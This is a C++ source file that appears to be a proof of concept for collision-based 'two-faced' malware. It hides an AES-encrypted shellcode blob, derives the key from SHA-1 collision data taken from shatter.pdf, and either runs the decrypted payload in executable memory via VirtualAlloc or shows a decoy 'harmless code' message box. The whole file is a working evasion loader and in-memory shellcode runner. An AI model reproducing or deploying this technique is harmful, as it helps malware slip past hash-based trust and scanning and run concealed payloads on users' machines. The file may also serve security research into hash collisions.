// TwoFace.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "collisionData.h"

#pragma section("shellcode",read,write)  
char* shellcodeEnc =   "\x6c\xed\x6b\xfc\x21\xfb\xf9\x8b\x3e\x11\x14\xf4\x8e\x68\xba\xe2"
						"\x16\x82\x13\x9d\xb5\xa3\xf5\x16\xe1\xc1\x88\x74\x1b\x53\x21\x43"
						"\xab\x00\x10\x61\xf5\x75\xb7\x66\x97\xde\x0e\x2f\x3c\x23\xbb\x5e"
						"\x0f\xe8\xc9\xd9\x4a\x6e\x9b\xf7\x07\xa9\x17\xfe\x01\x08\xe1\xa9"
						"\xdd\x97\xb3\x73\xff\x9d\x1d\x59\x7f\x31\x5b\x3e\x7b\xdb\x7a\x55"
						"\x83\x12\xb6\x42\xa2\x4d\xed\x5c\xeb\x3a\x48\x7a\x49\xaf\x6a\xc9"
						"\x5d\x5b\x09\xd0\xe8\x38\x86\x84\xca\x26\xc5\xc5\x97\x0a\x8b\x86"
						"\xfb\xd7\x88\xb5\xb9\xb2\x9b\x00\x49\xf7\x98\x0d\x68\xeb\x54\x20";



int collSize = sizeof(collision_data); //this is the 3*chunksize
int shellcodeSize = 128;
char* pattern = "\x0a\x31\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x2f\x57\x69\x64\x74"; // the second 16 bytes of the shatter.pdf
int patternSize = 16;
char* verifier = "BADCODE";

char* shellcode;

int searchPattern(char* buffer, int buffLen)
{
	for (int i=0; i< collSize; i++)
	{
		if (!memcmp(collision_data+i, pattern, patternSize))
			return i;
	}
	return NULL;
}

void evil(void)
{
	LPVOID lpAlloc = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(lpAlloc, shellcode+ strlen(verifier), shellcodeSize);

	((void(*)())lpAlloc)();
}

void good(void)
{
	MessageBox(0, L"This is a harmless code, nothing suspicious here! :)", L"Move along", MB_OK);
}

int main()
{
	int keyPos = searchPattern(&collision_data[0], collSize);
	if(keyPos == NULL)
	{
		printf("Key not found, exiting!");
		return -1;
	}
	keyPos = keyPos - 16 + 0xC0;

	shellcode = (char*)malloc(shellcodeSize);
	memset(shellcode, 0, shellcodeSize);
	CRijndael oRijndael;
	oRijndael.MakeKey(&collision_data[keyPos], "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16, 16);
	for (int i = 0; i < shellcodeSize; i += 16)
	{
		oRijndael.DecryptBlock(shellcodeEnc +i, shellcode+i);
	}
	if (!memcmp(verifier, shellcode, strlen(verifier)))
		evil();
	else
		good();

	return 0;
}
